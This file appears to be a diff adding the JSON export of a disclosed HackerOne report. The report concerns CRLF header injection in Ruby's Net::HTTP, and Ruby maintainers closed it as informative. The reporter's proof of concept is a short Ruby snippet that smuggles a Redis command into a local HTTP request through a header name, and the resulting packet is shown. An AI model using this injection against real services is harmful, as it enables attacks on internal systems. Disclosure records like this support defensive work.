@@ -1,0 +1,269 @@
+{
+    "id": 1718757,
+    "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNzE4NzU3",
+    "url": "https://hackerone.com/reports/1718757",
+    "title": "Header CRLF Injection in Ruby Net::HTTP",
+    "state": "Closed",
+    "substate": "informative",
+    "severity_rating": "none",
+    "readable_substate": "Informative",
+    "created_at": "2022-10-01T02:12:04.267Z",
+    "submitted_at": "2022-10-01T02:12:04.360Z",
+    "is_member_of_team?": false,
+    "is_organization_group_member?": false,
+    "reporter": {
+        "disabled": false,
+        "username": "leixiao",
+        "url": "/leixiao",
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/variants/2icnnokb5gyejdn1vcg5lg20e3mg/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98"
+        },
+        "is_me?": false,
+        "cleared": false,
+        "verified": false,
+        "hackerone_triager": false,
+        "hacker_mediation": false
+    },
+    "team": {
+        "id": 7724,
+        "url": "https://hackerone.com/ruby",
+        "handle": "ruby",
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/variants/000/007/724/bb067434deef370d6a0b16c2cbbc030b57c75e92_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+            "medium": "https://profile-photos.hackerone-user-content.com/variants/000/007/724/bb067434deef370d6a0b16c2cbbc030b57c75e92_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "permissions": [],
+        "submission_state": "open",
+        "default_currency": "usd",
+        "awards_miles": false,
+        "offers_bounties": true,
+        "state": "public_mode",
+        "only_cleared_hackers": false,
+        "pentest_feature_enabled?": false,
+        "profile": {
+            "name": "Ruby",
+            "twitter_handle": "",
+            "website": "https://www.ruby-lang.org",
+            "about": "A Programmer's Best Friend"
+        }
+    },
+    "has_bounty?": false,
+    "in_validation?": false,
+    "can_view_team": true,
+    "can_view_report": true,
+    "is_external_bug": false,
+    "is_published": false,
+    "is_participant": false,
+    "has_collaborators": false,
+    "submitted_by_team_member": false,
+    "stage": 4,
+    "public": true,
+    "visibility": "full",
+    "cve_ids": [],
+    "singular_disclosure_disabled": true,
+    "disclosed_at": "2023-05-04T01:40:31.030Z",
+    "bug_reporter_agreed_on_going_public_at": "2023-01-05T00:48:35.523Z",
+    "team_member_agreed_on_going_public_at": "2023-05-04T01:40:30.948Z",
+    "comments_closed?": false,
+    "facebook_team?": false,
+    "team_private?": false,
+    "vulnerability_information": "There is a Header CRLF Injection vulnerability in Ruby Net::HTTP.\nWhen I run the following code:\n```\nrequire 'net/http'\n\nhttp = Net::HTTP.new('127.0.0.1', 6379)\nheaders = {\n  \"test\\r\\nSET VULN POC \\r\\n\" => \"test\",\n}\nresp, data = http.get(\"/\", headers)\n```\nThe service on port 6379 will receive the following packet:\n```\nGET / HTTP/1.1\nTest\nset vuln poc\n: test\nAccept-Encoding: gzip;q=1.0,deflate;q=0.6,identity;q=0.3\nAccept: */*\nUser-Agent: Ruby\nConnection: close\nHost: 127.0.0.1:6379\n```\nThis means that if an attacker can control the header name, he can inject arbitrary content into the HTTP request. This is very dangerous.\n\n## Impact\n\nIf port 6379 is running the Redis service, the attacker can directly execute the Redis command. So this vulnerability can be used to attack internal services like Redis etc.\n{F1963847}",
+    "weakness": {
+        "id": 69,
+        "name": "CRLF Injection"
+    },
+    "original_report_id": null,
+    "original_report_url": null,
+    "attachments": [
+        {
+            "id": 1963847,
+            "file_name": "image.png",
+            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/shb6ii297lrlhiynmrlb9obj1oxi?response-content-disposition=attachment%3B%20filename%3D%22image.png%22%3B%20filename%2A%3DUTF-8%27%27image.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ4NRJGTOY%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T065641Z&X-Amz-Expires=351&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENH%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDx3ouIG6FkCFoEKa0SU5VFjrwb8IP9EHKfxKL810i%2BIgIhAPQitfLl9GJvhkVy9OJm8uQKNARvQ37yq17B8H%2BehRTFKroFCJr%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5IgwcUnn0J7BK%2BknDuosqjgWJVzMf5UQW6bNpkIv69nZ40K9jflFtWv%2FzYLPwlQ6XN40enQbSHJwv2Ke3RkFjdt4FGfsyl0LSMGiufLgw2ghL4l1Gya%2BCK%2Bm%2FBmTbJlNjuf35CacUo20tM2tWbE5vFzPLBVb%2Ft5GX1BM6KAxAT%2BUgDZHJ4ZLyyqdCXZ8KkUvMRU1S%2BtG118IJ3I%2BTndO8iEMxLI8F3xhV%2B48fp6ZmE3Jds9zMbE%2FOzqDog6%2BzMOV%2B1sNHeHHXhX5aAb1oXfUfCwHFkrlriaC23CAqMsMPoSW6NecbIfjfYPbcXDrVN0eynrDxyJ5jSAaunC1JCp4l83XzMe%2B0RwxgqUPjblr%2B7tf5a%2BIDJ0NYUMpA1lWSfdJafDbEPR1ZvWDnDkNhWqCMQUyzGb7%2BJmcaBRms4PQsnSU6kUnOkK5kE5PgeUnF08HxtaM%2BG9Ju7RpxnlCfF9Xzz1ljflmGCHubThgKnOo%2BoZ9fb2fDwxu%2BOEUScU9fIfsYkfYhJYoj6AdnE1HqUBa6WYgv3x%2FwD7BjU0hsx%2FV5gkxCYBKKwvykACQwMiPR4tGu5HnEUr6wriHvSjpliTMVTDMVD%2F4JSw1oy4kTDAaOgapUy8TdpKQMuy%2FoJxy5W%2Bfuy%2Fwf%2BtuVvExdfjSN4WAyaKAkdhfyokPwse9HT1KVi2Nfuuccpj1XFGyF%2FSOlk%2BluICj36kxODLCNK%2B9FJ3oeQY9Qdpw2dGf%2FAUEwb3%2F3hgLuv76pMFMyesKWzkLTRxOV0aOQJHTsNcB2rknTdLkURk5F9nfCMnZXEg7QtmWwu29VvWD6BZdCUDAL1bhBmEsCp2adrP%2BPEOjbqteKQfktHecJr2neNMNzfmmrHBPINgjlxDijjk79dDmxaJj%2Fk%2BQwwIO1pwY6sAHvmDL3Ty7idlBt0aUnUUFlqjUqAU%2F7MNZdlbWfExVId1rrL3cZniaVAVsYdXrexVOoXZTsRDapnFuziSEbsqAEoseGskH3dVfRa2Wdl3FrvSpjrYH1Ol7H%2BOnIsAi4srnMaXCFuLcdmj6Ye6%2BHKuXzkwC9fM5DC5m1DmX6592lnV8r8NRzBaqQPuUMb0mvhTcL%2FsU4jxd2YRDIayOUgDVL3fzL22N1ETXbRVAZ23PAVA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=97b45f2bb294bf66e32ac1055549f48536691631fa92cf9e549cd462e2c36c71",
+            "file_size": 167728,
+            "type": "image/png"
+        }
+    ],
+    "allow_singular_disclosure_at": null,
+    "vote_count": 4,
+    "voters": [
+        "zy9ard3",
+        "shubham_srt",
+        "khizer47",
+        "hi_analyst_sarthak"
+    ],
+    "severity": {
+        "rating": "none",
+        "author_type": "Team"
+    },
+    "structured_scope": {
+        "databaseId": 28212,
+        "asset_type": "SOURCE_CODE",
+        "asset_identifier": "https://github.com/ruby/ruby",
+        "max_severity": "critical"
+    },
+    "abilities": {
+        "assignable_team_members": [],
+        "assignable_team_member_groups": []
+    },
+    "activities": [
+        {
+            "id": 18603055,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::BugInformative",
+            "message": "Thank you for your report. I think this is a weaker variant of #146416, which was fixed as a normal bug (or an improvement). So I think it is good to treat this in the same way.",
+            "automated_response": false,
+            "created_at": "2022-10-01T02:46:26.183Z",
+            "updated_at": "2022-10-01T02:46:26.183Z",
+            "actor": {
+                "username": "mame",
+                "cleared": false,
+                "verified": false,
+                "url": "/mame",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/8vhoh1hyan61xovrmfhy7kmi4gib/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "ruby"
+        },
+        {
+            "id": 18603090,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "I think this is actually a security vulnerability. You can refer to the treatment of this problem by NodeJs and Python.\nRefer https://bugs.python.org/issue35906 , Python admit this is a security vulnerability and assign a cve to it.\nRefer https://hackerone.com/reports/1664019 , NodeJs assign a cve to it and offered bonus.",
+            "automated_response": false,
+            "created_at": "2022-10-01T03:08:38.224Z",
+            "updated_at": "2022-10-01T03:08:38.224Z",
+            "actor": {
+                "username": "leixiao",
+                "cleared": false,
+                "verified": false,
+                "url": "/leixiao",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/2icnnokb5gyejdn1vcg5lg20e3mg/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "ruby"
+        },
+        {
+            "id": 18603213,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ReportSeverityUpdated",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2022-10-01T04:19:31.310Z",
+            "updated_at": "2022-10-01T04:19:31.310Z",
+            "additional_data": {
+                "old_severity": "Critical",
+                "new_severity": "None",
+                "old_severity_id": 1682023,
+                "new_severity_id": 1682301
+            },
+            "actor": {
+                "username": "nobu",
+                "cleared": false,
+                "verified": false,
+                "url": "/nobu",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/083/585/0d7081d0d147b05e9630bb56974707efae6d6721_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "ruby"
+        },
+        {
+            "id": 19792740,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::AgreedOnGoingPublic",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2023-01-05T00:48:35.566Z",
+            "updated_at": "2023-01-05T00:48:35.566Z",
+            "first_to_agree": true,
+            "actor": {
+                "username": "leixiao",
+                "cleared": false,
+                "verified": false,
+                "url": "/leixiao",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/2icnnokb5gyejdn1vcg5lg20e3mg/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "ruby"
+        },
+        {
+            "id": 21674375,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::AgreedOnGoingPublic",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2023-05-04T01:40:30.990Z",
+            "updated_at": "2023-05-04T01:40:30.990Z",
+            "actor": {
+                "username": "hsbt",
+                "cleared": false,
+                "verified": false,
+                "url": "/hsbt",
+                "profile_picture_urls": {
+                    "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/dx6z1zqthgan1c4rv9ppn4jx3832/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937?response-content-disposition=inline%3B%20filename%3D%222eUvHh_4_400x400.png%22%3B%20filename%2A%3DUTF-8%27%272eUvHh_4_400x400.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ4NRJGTOY%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T065641Z&X-Amz-Expires=351&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENH%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDx3ouIG6FkCFoEKa0SU5VFjrwb8IP9EHKfxKL810i%2BIgIhAPQitfLl9GJvhkVy9OJm8uQKNARvQ37yq17B8H%2BehRTFKroFCJr%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5IgwcUnn0J7BK%2BknDuosqjgWJVzMf5UQW6bNpkIv69nZ40K9jflFtWv%2FzYLPwlQ6XN40enQbSHJwv2Ke3RkFjdt4FGfsyl0LSMGiufLgw2ghL4l1Gya%2BCK%2Bm%2FBmTbJlNjuf35CacUo20tM2tWbE5vFzPLBVb%2Ft5GX1BM6KAxAT%2BUgDZHJ4ZLyyqdCXZ8KkUvMRU1S%2BtG118IJ3I%2BTndO8iEMxLI8F3xhV%2B48fp6ZmE3Jds9zMbE%2FOzqDog6%2BzMOV%2B1sNHeHHXhX5aAb1oXfUfCwHFkrlriaC23CAqMsMPoSW6NecbIfjfYPbcXDrVN0eynrDxyJ5jSAaunC1JCp4l83XzMe%2B0RwxgqUPjblr%2B7tf5a%2BIDJ0NYUMpA1lWSfdJafDbEPR1ZvWDnDkNhWqCMQUyzGb7%2BJmcaBRms4PQsnSU6kUnOkK5kE5PgeUnF08HxtaM%2BG9Ju7RpxnlCfF9Xzz1ljflmGCHubThgKnOo%2BoZ9fb2fDwxu%2BOEUScU9fIfsYkfYhJYoj6AdnE1HqUBa6WYgv3x%2FwD7BjU0hsx%2FV5gkxCYBKKwvykACQwMiPR4tGu5HnEUr6wriHvSjpliTMVTDMVD%2F4JSw1oy4kTDAaOgapUy8TdpKQMuy%2FoJxy5W%2Bfuy%2Fwf%2BtuVvExdfjSN4WAyaKAkdhfyokPwse9HT1KVi2Nfuuccpj1XFGyF%2FSOlk%2BluICj36kxODLCNK%2B9FJ3oeQY9Qdpw2dGf%2FAUEwb3%2F3hgLuv76pMFMyesKWzkLTRxOV0aOQJHTsNcB2rknTdLkURk5F9nfCMnZXEg7QtmWwu29VvWD6BZdCUDAL1bhBmEsCp2adrP%2BPEOjbqteKQfktHecJr2neNMNzfmmrHBPINgjlxDijjk79dDmxaJj%2Fk%2BQwwIO1pwY6sAHvmDL3Ty7idlBt0aUnUUFlqjUqAU%2F7MNZdlbWfExVId1rrL3cZniaVAVsYdXrexVOoXZTsRDapnFuziSEbsqAEoseGskH3dVfRa2Wdl3FrvSpjrYH1Ol7H%2BOnIsAi4srnMaXCFuLcdmj6Ye6%2BHKuXzkwC9fM5DC5m1DmX6592lnV8r8NRzBaqQPuUMb0mvhTcL%2FsU4jxd2YRDIayOUgDVL3fzL22N1ETXbRVAZ23PAVA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=0ad122e91d5a6a01bf6e099c32aa478eb02dfd1192d96dbbe66038843a3b62f0"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "ruby"
+        },
+        {
+            "id": 21674376,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ReportBecamePublic",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2023-05-04T01:40:31.078Z",
+            "updated_at": "2023-05-04T01:40:31.078Z",
+            "actor": {
+                "username": "hsbt",
+                "cleared": false,
+                "verified": false,
+                "url": "/hsbt",
+                "profile_picture_urls": {
+                    "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/dx6z1zqthgan1c4rv9ppn4jx3832/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937?response-content-disposition=inline%3B%20filename%3D%222eUvHh_4_400x400.png%22%3B%20filename%2A%3DUTF-8%27%272eUvHh_4_400x400.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ4NRJGTOY%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T065641Z&X-Amz-Expires=351&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENH%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDx3ouIG6FkCFoEKa0SU5VFjrwb8IP9EHKfxKL810i%2BIgIhAPQitfLl9GJvhkVy9OJm8uQKNARvQ37yq17B8H%2BehRTFKroFCJr%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5IgwcUnn0J7BK%2BknDuosqjgWJVzMf5UQW6bNpkIv69nZ40K9jflFtWv%2FzYLPwlQ6XN40enQbSHJwv2Ke3RkFjdt4FGfsyl0LSMGiufLgw2ghL4l1Gya%2BCK%2Bm%2FBmTbJlNjuf35CacUo20tM2tWbE5vFzPLBVb%2Ft5GX1BM6KAxAT%2BUgDZHJ4ZLyyqdCXZ8KkUvMRU1S%2BtG118IJ3I%2BTndO8iEMxLI8F3xhV%2B48fp6ZmE3Jds9zMbE%2FOzqDog6%2BzMOV%2B1sNHeHHXhX5aAb1oXfUfCwHFkrlriaC23CAqMsMPoSW6NecbIfjfYPbcXDrVN0eynrDxyJ5jSAaunC1JCp4l83XzMe%2B0RwxgqUPjblr%2B7tf5a%2BIDJ0NYUMpA1lWSfdJafDbEPR1ZvWDnDkNhWqCMQUyzGb7%2BJmcaBRms4PQsnSU6kUnOkK5kE5PgeUnF08HxtaM%2BG9Ju7RpxnlCfF9Xzz1ljflmGCHubThgKnOo%2BoZ9fb2fDwxu%2BOEUScU9fIfsYkfYhJYoj6AdnE1HqUBa6WYgv3x%2FwD7BjU0hsx%2FV5gkxCYBKKwvykACQwMiPR4tGu5HnEUr6wriHvSjpliTMVTDMVD%2F4JSw1oy4kTDAaOgapUy8TdpKQMuy%2FoJxy5W%2Bfuy%2Fwf%2BtuVvExdfjSN4WAyaKAkdhfyokPwse9HT1KVi2Nfuuccpj1XFGyF%2FSOlk%2BluICj36kxODLCNK%2B9FJ3oeQY9Qdpw2dGf%2FAUEwb3%2F3hgLuv76pMFMyesKWzkLTRxOV0aOQJHTsNcB2rknTdLkURk5F9nfCMnZXEg7QtmWwu29VvWD6BZdCUDAL1bhBmEsCp2adrP%2BPEOjbqteKQfktHecJr2neNMNzfmmrHBPINgjlxDijjk79dDmxaJj%2Fk%2BQwwIO1pwY6sAHvmDL3Ty7idlBt0aUnUUFlqjUqAU%2F7MNZdlbWfExVId1rrL3cZniaVAVsYdXrexVOoXZTsRDapnFuziSEbsqAEoseGskH3dVfRa2Wdl3FrvSpjrYH1Ol7H%2BOnIsAi4srnMaXCFuLcdmj6Ye6%2BHKuXzkwC9fM5DC5m1DmX6592lnV8r8NRzBaqQPuUMb0mvhTcL%2FsU4jxd2YRDIayOUgDVL3fzL22N1ETXbRVAZ23PAVA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=0ad122e91d5a6a01bf6e099c32aa478eb02dfd1192d96dbbe66038843a3b62f0"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "ruby"
+        }
+    ],
+    "activity_page_count": 1,
+    "activity_page_number": 1,
+    "summaries": [
+        {
+            "category": "team",
+            "can_view?": true,
+            "can_create?": false
+        },
+        {
+            "category": "researcher",
+            "can_view?": true,
+            "can_create?": false
+        }
+    ]
+}
